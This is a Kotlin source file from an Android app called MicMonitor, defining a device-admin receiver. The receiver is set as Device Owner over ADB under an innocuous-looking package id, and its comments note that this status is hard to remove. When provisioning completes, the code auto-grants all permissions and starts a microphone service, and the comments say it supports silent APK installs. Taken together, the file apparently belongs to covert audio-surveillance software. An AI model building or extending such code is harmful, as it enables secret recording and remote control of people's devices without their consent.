package com.micmonitor.app

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

/**
 * Device Admin Receiver for MicMonitor
 * 
 * Required for silent APK installation when app is Device Owner.
 * 
 * To set as Device Owner (one-time per device via ADB):
 *   adb shell dpm set-device-owner com.device.services.app/com.micmonitor.app.DeviceAdminReceiver
 * 
 * To remove Device Owner:
 *   Note: adb remove-active-admin fails for real Device Owner (non-test admin).
 *   Use in-app clear_device_owner command (calls clearDeviceOwnerApp), or factory reset.
 *   adb shell dpm remove-active-admin com.device.services.app/com.micmonitor.app.DeviceAdminReceiver
 */
class DeviceAdminReceiver : DeviceAdminReceiver() {
    
    companion object {
        private const val TAG = "DeviceAdminReceiver"
    }

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        Log.i(TAG, "Device Admin enabled - checking for Device Owner status")
        
        // If we just became Device Owner, trigger auto-start/grant
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        if (dpm.isDeviceOwnerApp(context.packageName)) {
            Log.i(TAG, "Confirming Device Owner status - triggering auto-start")
            onProfileProvisioningComplete(context, intent)
        }
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        Log.i(TAG, "Device Admin disabled")
    }

    override fun onProfileProvisioningComplete(context: Context, intent: Intent) {
        super.onProfileProvisioningComplete(context, intent)
        Log.i(TAG, "Profile provisioning complete - performing auto-start")
        
        // 1. Grant all permissions immediately
        try {
            UpdateService.autoGrantPermissions(context)
            Log.i(TAG, "Permissions auto-granted after provisioning")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to auto-grant permissions: ${e.message}")
        }
        
        // 2. Launch UI and start Service
        try {
            val activityIntent = Intent(context, MainActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            }
            context.startActivity(activityIntent)
            
            val serviceIntent = Intent(context, MicService::class.java)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
            
            Log.i(TAG, "MainActivity and MicService launched after provisioning")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to launch app after provisioning: ${e.message}")
        }
    }
}
